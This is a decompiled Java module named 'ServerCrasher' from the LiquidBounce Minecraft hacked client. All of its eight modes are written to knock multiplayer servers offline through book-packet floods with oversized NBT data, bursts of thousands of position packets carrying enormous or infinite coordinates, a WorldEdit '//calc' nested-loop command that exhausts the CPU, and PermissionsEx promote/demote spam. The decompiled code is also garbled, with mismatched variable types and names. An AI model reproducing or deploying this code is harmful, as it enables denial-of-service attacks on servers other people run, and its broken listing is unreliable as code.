//Deobfuscated with https://github.com/PetoPetko/Minecraft-Deobfuscator3000 using mappings "mcp_stable-22-1.8.9"!

package net.ccbluex.liquidbounce.features.module.modules.exploit;

import io.netty.buffer.Unpooled;
import java.util.Random;
import net.ccbluex.liquidbounce.event.EventState;
import net.ccbluex.liquidbounce.event.EventTarget;
import net.ccbluex.liquidbounce.event.MotionEvent;
import net.ccbluex.liquidbounce.event.TickEvent;
import net.ccbluex.liquidbounce.event.WorldEvent;
import net.ccbluex.liquidbounce.features.module.Module;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.utils.misc.RandomUtils;
import net.ccbluex.liquidbounce.utils.timer.MSTimer;
import net.ccbluex.liquidbounce.value.ListValue;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition;

@ModuleInfo(
   name = "ServerCrasher",
   description = "Allows you to crash certain server.",
   category = ModuleCategory.EXPLOIT
)
public class ServerCrasher extends Module {
   // $FF: synthetic field
   private MSTimer pexTimer = new MSTimer();
   // $FF: synthetic field
   private final ListValue modeValue = new ListValue("Mode", new String[]{"AACNew", "AACOther", "AACOld", "WorldEdit", "Pex", "BookFlood", "CubeCraft", "MassiveChunkLoading"}, "AACNew");

   @EventTarget
   public void onWorld(WorldEvent lllllIlIIlll) {
      if (lllllIlIIlll.getWorldClient() == null) {
         lllllIlIlIII.setState(false);
      }

   }

   @EventTarget
   public void onTick(TickEvent lllllIlIIIlI) {
      if (mc.thePlayer == null || mc.theWorld == null) {
         lllllIlIIIll.setState(false);
      }

   }

   public String getTag() {
      return (String)lllllIIllllI.modeValue.get();
   }

   @EventTarget
   public void onMotion(MotionEvent lllllIlllIII) {
      if (lllllIlllIII.getEventState() != EventState.POST) {
         short lllllIllIlIl = ((String)lllllIllIlll.modeValue.get()).toLowerCase();
         short lllllIllIlII = -1;
         switch(lllllIllIlIl.hashCode()) {
         case -1031473397:
            if (lllllIllIlIl.equals("cubecraft")) {
               lllllIllIlII = 1;
            }
            break;
         case 110883:
            if (lllllIllIlIl.equals("pex")) {
               lllllIllIlII = 2;
            }
            break;
         case 2031047349:
            if (lllllIllIlIl.equals("bookflood")) {
               lllllIllIlII = 0;
            }
         }

         switch(lllllIllIlII) {
         case 0:
            short lllllIllIIll = new ItemStack(Items.writable_book);
            NBTTagCompound llllllIIIIII = new NBTTagCompound();
            llllllIIIIII.setString("author", RandomUtils.randomNumber(20));
            llllllIIIIII.setString("title", RandomUtils.randomNumber(20));
            NBTTagList lllllIllllll = new NBTTagList();
            String lllllIlllllI = RandomUtils.randomNumber(600);

            int llllllIIIIlI;
            for(llllllIIIIlI = 0; llllllIIIIlI < 50; ++llllllIIIIlI) {
               lllllIllllll.appendTag(new NBTTagString(lllllIlllllI));
            }

            llllllIIIIII.setTag("pages", lllllIllllll);
            lllllIllIIll.setTagCompound(llllllIIIIII);

            for(llllllIIIIlI = 0; llllllIIIIlI < 100; ++llllllIIIIlI) {
               PacketBuffer llllllIIIIll = new PacketBuffer(Unpooled.buffer());
               llllllIIIIll.writeItemStackToBuffer(lllllIllIIll);
               mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload((new Random()).nextBoolean() ? "MC|BSign" : "MC|BEdit", llllllIIIIll));
            }

            return;
         case 1:
            double lllllIllllII = mc.thePlayer.posX;
            byte lllllIlIllIl = mc.thePlayer.posY;
            double lllllIlllIlI = mc.thePlayer.posZ;

            for(int lllllIlIlIll = 0; lllllIlIlIll < 3000; ++lllllIlIlIll) {
               mc.getNetHandler().addToSendQueue(new C04PacketPlayerPosition(lllllIllllII, lllllIlIllIl + 0.09999999999999D, lllllIlllIlI, false));
               mc.getNetHandler().addToSendQueue(new C04PacketPlayerPosition(lllllIllllII, lllllIlIllIl, lllllIlllIlI, true));
            }

            mc.thePlayer.motionY = 0.0D;
            break;
         case 2:
            if (lllllIllIlll.pexTimer.hasTimePassed(2000L)) {
               mc.thePlayer.sendChatMessage((new Random()).nextBoolean() ? "/pex promote a a" : "/pex demote a a");
               lllllIllIlll.pexTimer.reset();
            }
            break;
         default:
            lllllIllIlll.setState(false);
         }

      }
   }

   public void onEnable() {
      if (mc.thePlayer != null) {
         Exception llllllIlIlII = ((String)llllllIlIlIl.modeValue.get()).toLowerCase();
         String llllllIlIIll = -1;
         switch(llllllIlIlII.hashCode()) {
         case -1425299843:
            if (llllllIlIlII.equals("aacnew")) {
               llllllIlIIll = 0;
            }
            break;
         case -1425298684:
            if (llllllIlIlII.equals("aacold")) {
               llllllIlIIll = 2;
            }
            break;
         case -1031473397:
            if (llllllIlIlII.equals("cubecraft")) {
               llllllIlIIll = 4;
            }
            break;
         case -11181677:
            if (llllllIlIlII.equals("massivechunkloading")) {
               llllllIlIIll = 5;
            }
            break;
         case 382777517:
            if (llllllIlIlII.equals("aacother")) {
               llllllIlIIll = 1;
            }
            break;
         case 1123315868:
            if (llllllIlIlII.equals("worldedit")) {
               llllllIlIIll = 3;
            }
         }

         int llllllIlIIlI;
         switch(llllllIlIIll) {
         case 0:
            for(llllllIlIIlI = 0; llllllIlIIlI < 9999; ++llllllIlIIlI) {
               mc.getNetHandler().addToSendQueue(new C04PacketPlayerPosition(mc.thePlayer.posX + (double)(9412 * llllllIlIIlI), mc.thePlayer.getEntityBoundingBox().minY + (double)(9412 * llllllIlIIlI), mc.thePlayer.posZ + (double)(9412 * llllllIlIIlI), true));
            }

            return;
         case 1:
            for(llllllIlIIlI = 0; llllllIlIIlI < 9999; ++llllllIlIIlI) {
               mc.getNetHandler().addToSendQueue(new C04PacketPlayerPosition(mc.thePlayer.posX + (double)(500000 * llllllIlIIlI), mc.thePlayer.getEntityBoundingBox().minY + (double)(500000 * llllllIlIIlI), mc.thePlayer.posZ + (double)(500000 * llllllIlIIlI), true));
            }

            return;
         case 2:
            mc.getNetHandler().addToSendQueue(new C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
            break;
         case 3:
            mc.thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
            break;
         case 4:
            mc.thePlayer.setPosition(mc.thePlayer.posX, mc.thePlayer.posY + 0.3D, mc.thePlayer.posZ);
            break;
         case 5:
            for(double llllllIlIIlI = mc.thePlayer.posY; llllllIlIIlI < 255.0D; llllllIlIIlI += 5.0D) {
               mc.getNetHandler().addToSendQueue(new C04PacketPlayerPosition(mc.thePlayer.posX, llllllIlIIlI, mc.thePlayer.posZ, true));
            }

            for(llllllIlIIlI = 0; llllllIlIIlI < 6685; llllllIlIIlI += 5) {
               mc.getNetHandler().addToSendQueue(new C04PacketPlayerPosition(mc.thePlayer.posX + (double)llllllIlIIlI, 255.0D, mc.thePlayer.posZ + (double)llllllIlIIlI, true));
            }
         }

      }
   }
}
